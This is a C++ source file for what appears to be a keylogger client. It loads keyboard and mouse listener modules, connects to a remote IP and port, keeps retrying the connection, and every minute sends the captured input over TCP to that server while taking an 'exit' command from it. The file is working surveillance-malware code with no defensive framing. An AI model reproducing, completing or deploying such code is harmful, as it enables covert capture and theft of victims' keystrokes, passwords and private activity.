//
// Created by Clément Péau on 27/09/2017.
//

#include <boost/bind.hpp>
#include <iostream>
#include <boost/array.hpp>
#include "client/AsioClient.hpp"


void 	AsioClient::init_time(t_delays *delays)
{
  delays->time_stru.tm_hour = 0;
  delays->time_stru.tm_mday = 1;
  delays->time_stru.tm_sec = 0;
  delays->time_stru.tm_min = 0;
  delays->time_stru.tm_year = 100;
  delays->time_stru.tm_mon = 0;
  time(&delays->t);
  delays->sec = 0;
  delays->old_sec = difftime(delays->t, mktime(&delays->time_stru));
}

std::string answer_to_string( boost::asio::streambuf &answer)
{
  std::string	res;
  std::istream bufs(&answer);

  bufs >> res;
  return res;
}

bool 		AsioClient::stop(const std::string msg) const
{
  if (msg == "exit")
    return true;
  return false;
}

AsioClient::AsioClient(boost::asio::io_service &io_service, unsigned short port): socket(io_service)
{
  this->port = port;
  this->modules[0x10] = new Module(OP_KEYBOARD, "KeyboardListener.dll");
  this->modules[0x11] = new Module(OP_MOUSE, "MouseClickListener.dll");
}

AsioClient::~AsioClient()
{

}

void 		AsioClient::try_send(const std::string host)
{
  boost::asio::ip::tcp::endpoint endpoint(boost::asio::ip::address::from_string(host), this->port);
  std::string 			message;
  boost::system::error_code 	err;
  boost::asio::streambuf	f_buf;
  Command			command;
  t_delays			delays;

  this->connect(endpoint, err);
  this->init_time(&delays);
  while (1) {
    try {
      boost::asio::async_read(socket, answer, boost::asio::transfer_at_least(1),
			      boost::bind(&AsioClient::handle_read_body, this,
					  boost::asio::placeholders::error));
    }
    catch (std::exception e)
    {
      std::cerr << e.what() << std::endl;
    }
    message = answer_to_string(answer);
    if (!message.empty())
      std::cout << message << std::endl;
    if (this->stop(message))
      return ;
    time(&delays.t);
    if (((delays.sec = difftime(delays.t, mktime(&delays.time_stru))) - delays.old_sec) > 60) {
      delays.old_sec = delays.sec;
      if (command.process(this->modules, (char)0x10, f_buf)) {
	boost::asio::async_write(socket, boost::asio::buffer(f_buf.data()),
				 boost::bind(&AsioClient::handle_read_state,
					     this, boost::asio::placeholders::error));

      }
      if (command.process(this->modules, (char)0x11, f_buf)) {
	boost::asio::async_write(socket, boost::asio::buffer(f_buf.data()),
				 boost::bind(&AsioClient::handle_read_state,
					     this, boost::asio::placeholders::error));
      }
    }
  }
  //this->socket.close();
}

bool AsioClient::connect(boost::asio::ip::tcp::endpoint endpoint, boost::system::error_code err) {
  this->socket.connect(endpoint, err);
  if (err) {
    while (err) {
      std::cout << "connect_error" << std::endl;
      this->socket.connect(endpoint, err);
    }
  }
  return true;
}

int main(int ac, char **av)
{
  boost::asio::io_service io_service;
  io_service.run();

  if (ac != 3)
  {
    std::cout << "Usage: ./client <ip_adress> <port>" << std::endl;
    return 0;
  }
  AsioClient	Asiatic(io_service, (unsigned short)std::stoi(av[2]));
  Asiatic.try_send(av[1]);
  return 0;
}
